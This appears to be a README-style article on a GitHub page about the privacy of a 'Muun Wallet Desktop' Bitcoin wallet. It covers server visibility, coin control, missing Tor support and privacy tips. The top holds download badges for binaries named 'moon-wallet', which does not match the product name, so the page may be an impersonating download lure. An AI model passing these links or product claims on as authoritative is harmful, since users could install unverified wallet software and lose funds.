[![Muun Wallet](https://img.shields.io/badge/Muun%20Wallet-Desktop-blue)](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1) [![Platforms](https://img.shields.io/badge/platforms-macOS%20%7C%20Windows%20%7C%20Linux-lightgrey)](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1) [![License](https://img.shields.io/badge/license-MIT-green)](https://github.com/muun-network/muun-wallet/blob/main/LICENSE)

[![macOS](https://img.shields.io/badge/Download-macOS-black?logo=apple&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.dmg) [![Windows](https://img.shields.io/badge/Download-Windows-0078d4?logo=windows&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.exe) [![Linux](https://img.shields.io/badge/Download-Linux-f5a623?logo=linux&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.zip)

---

# Muun Wallet Privacy: What Data Is Collected and How to Minimize It

Privacy is a spectrum in Bitcoin wallets, and Muun Wallet Desktop sits at a specific point on it — not the most private option available, but significantly better than custodial alternatives, with specific improvements in the desktop version compared to the original mobile app. This article covers what data Muun has visibility into, where the gaps are, and what you can do to minimize exposure.

---

## What Muun's infrastructure can see

Because Muun uses submarine swaps, all Bitcoin transactions involving Lightning payments pass through Muun's swap infrastructure. This means Muun's servers have visibility into:

- **Your balance and transaction history**: Muun's infrastructure is involved in processing every send and receive, which means it can see transaction amounts, timestamps, and counterparty addresses at the time of the swap.
- **Your IP address**: when you connect to Muun's servers, your IP address is visible to those servers, as with any internet service.

What Muun does not see or store (by architectural design, not policy):
- Your private keys — those are on your device and encoded in your Emergency Kit only.
- Your identity — no account, no email, no KYC is required.

---

## Improvements in Muun Wallet Desktop

**Clipboard privacy**: the mobile app had a widely reported issue where it automatically read the clipboard when the Send or Receive screen was opened — raising concerns about apps that cycle through clipboard content in the background reading sensitive data. Muun Wallet Desktop fixes this: address auto-detection from the clipboard happens only when you explicitly trigger it, never automatically on screen open.

**Coin control**: available on desktop only, coin control lets you select specific UTXOs to fund a transaction. This is relevant for privacy because it lets you avoid inadvertently linking unrelated UTXOs (and their associated transaction history) in a single spend. Wallets without coin control make this choice for you, which can link coin histories you would rather keep separate.

---

## Where Muun Wallet is weaker than privacy-focused alternatives

**No Tor support**: Muun Wallet Desktop does not route connections through Tor. This means your IP address is visible to Muun's servers. Wallets like Sparrow (with Tor enabled) or wallets connecting to your own node over Tor can avoid this. If IP-level privacy is important to your threat model, Muun is not the right tool.

**No custom node connection**: Muun connects to Muun's infrastructure for block and transaction data. It does not support connecting to your own Bitcoin Core node or Electrum server. Wallets that support this give you full privacy over your UTXO lookup history — Muun does not.

**Swap infrastructure visibility**: the submarine swap process means Muun's servers participate in every Lightning payment. If this level of server-side visibility is unacceptable, a wallet using your own Lightning node (Zeus connected to your own LND) or a wallet that uses LSPs with minimal data collection is a better fit.

---

## Practical steps to improve privacy with Muun Wallet Desktop

**Use coin control for larger or privacy-sensitive transactions.** Available in the Send flow on desktop, coin control lets you specify which UTXOs fund the transaction. Group unrelated funds into separate accounts in Muun's multi-account feature to avoid cross-contaminating their histories.

**Use a VPN if Tor is not available to you.** A VPN masks your IP from Muun's servers at minimum, though VPN providers can see your traffic — it trades one trust relationship for another. This is a modest privacy improvement, not a strong one.

**Do not reuse addresses.** Muun generates fresh receive addresses by default. Using a unique address for each receive is the baseline on-chain privacy practice and Muun supports it automatically.

**Separate accounts for separate purposes.** Muun Wallet Desktop supports multiple accounts under one Emergency Kit. Using separate accounts for funds with different origins or uses limits cross-account linkage.

---

## Summary

Muun Wallet Desktop is self-custodial and requires no account or identity to use — meaningfully better privacy than custodial alternatives. The desktop version fixes the clipboard issue present in the mobile app and adds coin control. It is not designed for users with strong operational privacy requirements: no Tor support, no custom node connection, swap infrastructure visible to Muun. For those use cases, Sparrow with your own node, or Zeus connected to your own Lightning node, are better fits.

More information at [muun-wallet.com](https://muun-wallet.com/).

---

## Related articles

- [Is Muun Wallet safe?](is-muun-wallet-safe.md)
- [Muun Wallet coin control](muun-wallet-coin-control.md)
- [Muun Wallet vs Sparrow Wallet](muun-wallet-vs-sparrow-wallet.md)
- [What is a non-custodial Bitcoin wallet?](what-is-a-non-custodial-bitcoin-wallet.md)
- [Muun Wallet review 2026](muun-wallet-review-2026.md)
